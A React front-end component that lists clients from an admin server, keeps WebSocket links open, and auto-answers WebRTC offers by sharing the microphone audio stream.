import React, { useState, useEffect, useRef, useCallback } from "react";
import { notifyUser } from "../Helper/WindowsNotification";
import WebRTCManager from "../Helper/WebRTCManager";
import { toast } from "react-toastify";
import { getClients } from "../Helper/Requests";
import WebSocketManager from "../Helper/WebSocketManager";
const ClientConfig = () => {
  const [clients, setClients] = useState([]);
  const [selectedClient, setSelectedClient] = useState(
    localStorage.getItem("selectedClientId") || ""
  );
  const [cd, Scd] = useState();
  const [peerStatus, setPeerStatus] = useState();
  const peerRef = useRef(null);
  const lastSdpRef = useRef(null);
  const creatingPeerRef = useRef(false); // <-- prevent duplicate peers
  const autoAnsweringRef = useRef(false); // <-- prevent duplicate answers
  let webSockRef = useRef({});
  let Wsm = useRef({});
  let ccRef = useRef([]);
  const [offerReceived, setOfferReceived] = useState(false);
  let WebsockURL = import.meta.env.VITE_SOCKER_URL;
  const createPeerForUser = () => {
    if (creatingPeerRef.current) return;
    creatingPeerRef.current = true;

    if (peerRef.current) {
      peerRef.current.close();
      peerRef.current.destroy?.();
      peerRef.current = null;
    }

    const newPeer = new WebRTCManager();
    newPeer.createPeer(true);
    peerRef.current = newPeer;

    toast.success("Peer created successfully!");
    creatingPeerRef.current = false;
  };

  const deletePeerForUser = () => {
    if (peerRef.current) {
      try {
        peerRef.current.close();
        peerRef.current.destroy?.();
        peerRef.current = null;
        return true;
      } catch (err) {
        console.error(err);
        return false;
      }
    }
    return false;
  };
  // ---------- Handle incoming WebSocket offers ----------
const handleIncomingOffer = useCallback(
  async (msg) => {
    if (!msg?.type || msg.type !== "offer" || !msg.sdp) return;

    console.log("Incoming offer received:", msg);

    // Skip duplicate SDP
    if (autoAnsweringRef.current && lastSdpRef.current === msg.sdp) return;

    // store offer in state
    Scd({ sdp: msg.sdp, ice: msg.ice, ...msg });
    setOfferReceived(true);

    // ensure peer exists
    if (!peerRef.current) {
      createPeerForUser();
      await new Promise((resolve) => setTimeout(resolve, 500));
    }

    // Auto-answer
    await handleAutoAnswer({ sdp: msg.sdp, ice: msg.ice });

    // mark SDP as answered
    lastSdpRef.current = msg.sdp;
  },
  [selectedClient]
);

  const showStatusForPeer = () => {
    if (!peerRef.current) return;
    try {
      const status = peerRef.current.getStatus();
      setPeerStatus(status);
    } catch (err) {
      console.error("Error getting peer status:", err);
    }
  };

  const fetch_clients = async () => {
    try {
      const clientList = await getClients();
      const temp = await Promise.all(
        clientList.client_ids.map((cid) => getClients(cid))
      );
      setClients(temp);

      if (!selectedClient) return;

      const clientObj = temp.find((c) => Object.keys(c)[0] === selectedClient);
      if (!clientObj) {
        toast.warn("Selected client removed.");
        setSelectedClient("");
        Scd(null);
        deletePeerForUser();
        localStorage.removeItem("selectedClientId");
        return;
      }

      const clientData = clientObj[selectedClient];
      const localState = peerStatus?.peerConnectionState;
      const serverState = clientData?.status;

      const badStates = ["new", "disconnected", "failed", "closed", undefined];

      // ✅ Only create peer if none exists or previous one fully failed
      if (!peerRef.current) {
        createPeerForUser();
      } else if (
        peerRef.current &&
        !["connected", "connecting"].includes(localState)
      ) {
        if (
          !creatingPeerRef.current &&
          (serverState === "disconnected" || serverState === "failed")
        ) {
          createPeerForUser();
        }
      }

      // auto-answer
      if (
        clientData.sdp &&
        clientData.ice?.length > 0 &&
        localState !== "connected" &&
        localState !== "connecting" &&
        !autoAnsweringRef.current &&
        lastSdpRef.current !== clientData.sdp
      ) {
        lastSdpRef.current = clientData.sdp;
        Scd(clientData);
        handleAutoAnswer(clientData);
      }
    } catch (err) {
      console.error("Failed to fetch clients:", err);
    }
  };

  useEffect(() => {
    ccRef.current = clients;
  }, [clients]);

  //------------WebSock Manager------------

  let webSockAutoManager = () => {
    const Clients = ccRef.current;
    const existingClientIds = Clients.map((c) => Object.keys(c)[0]);

    // Clean up WebSockets for clients that no longer exist
    Object.keys(webSockRef.current).forEach((id) => {
      if (!existingClientIds.includes(id)) {
        console.log("Destroying WebSocket for removed client:", id);
        webSockRef.current[id]?.disconnect?.();
        delete webSockRef.current[id];
        delete Wsm.current[id];
      }
    });

    if (!Array.isArray(Clients) || Clients.length === 0) {
      console.log("No clients found");
      return;
    }

    // Auto-connect logic for existing clients
    for (let c of Clients) {
      const id = Object.keys(c)[0];
      if (id === selectedClient) {
        if (!webSockRef.current[id]) {
          webSockRef.current[id] = new WebSocketManager(`${WebsockURL}/${id}`, {
            id,
            onOpen: () => console.log("Connected:", id),
            onClose: () => console.log("Closed:", id),
            onMessage: (msg) => {
              if (!msg)
                return console.warn("Received undefined message for", id);
              Wsm.current[id] = msg;
              console.log("Stored message for", id, msg);

              // NEW: Handle offer messages
              handleIncomingOffer(msg);
            },
          });
        } else if (!webSockRef.current[id]?.isConnected) {
          // Reconnect if existing but closed
          console.log("Reconnecting socket for", id);
          webSockRef.current[id]?.disconnect?.();
          webSockRef.current[id]?.connect?.();
        }
      }
    }
  };

  //------------WebSock Manager End------------

  useEffect(() => {
    fetch_clients();
  }, []);

  // Auto peer status check every 10s
  useEffect(() => {
    const interval = setInterval(() => {
      showStatusForPeer();
      fetch_clients();
    }, 10000);

    return () => clearInterval(interval);
  }, [selectedClient, peerStatus]);

  useEffect(() => {
    let tot = setInterval(() => {
      webSockAutoManager();
    }, 2000);
    return () => clearInterval(tot);
  }, []);
const handleAutoAnswer = async (clientDetails) => {
  if (!clientDetails?.sdp) return;

  // ensure peer exists
  if (!peerRef.current) {
    createPeerForUser();
    await new Promise((resolve) => setTimeout(resolve, 500));
  }

  // block duplicate offers only if SDP unchanged
  if (autoAnsweringRef.current && lastSdpRef.current === clientDetails.sdp) return;

  autoAnsweringRef.current = true;

  try {
    const localStream = await navigator.mediaDevices.getUserMedia({
      audio: true,
      video: false,
    });

    const ans = await peerRef.current.createAnswer(
      { type: "offer", sdp: clientDetails.sdp },
      clientDetails.ice,
      localStream
    );

    if (webSockRef.current[selectedClient]) {
      webSockRef.current[selectedClient].send({
        type: "answer",
        answer_sdp: ans.sdp,
        ice: Array.isArray(ans.aid) ? ans.aid : [],
      });

      // trigger server to return answer back
      webSockRef.current[selectedClient].send({ type: "sasr" });
    }
  } catch (err) {
    console.error("Error auto-answering:", err);
  } finally {
    autoAnsweringRef.current = false;
    lastSdpRef.current = clientDetails.sdp; // mark as answered
  }
};


  //---------------- UI ----------------
  if (selectedClient) return null;

  return (
    <div className="p-4 max-w-md mx-auto">
      <h3 className="mb-2 font-semibold">Select Client</h3>
      {clients.length === 0 ? (
        <p className="text-gray-500">Waiting for clients from admin panel...</p>
      ) : (
        <select
          className="select select-bordered w-full mb-4"
          value={selectedClient}
          onChange={(e) => {
            const id = e.target.value;
            setSelectedClient(id);
            localStorage.setItem("selectedClientId", id);

            const clientObj = clients.find((c) => Object.keys(c)[0] === id);
            if (clientObj) Scd(clientObj[id]);

            createPeerForUser();
          }}
        >
          <option value="" disabled>
            -- Select a Client --
          </option>
          {clients.map((c, idx) => {
            const id = Object.keys(c)[0];
            return (
              <option key={idx} value={id}>
                {id}
              </option>
            );
          })}
        </select>
      )}
    </div>
  );
};

export default ClientConfig;
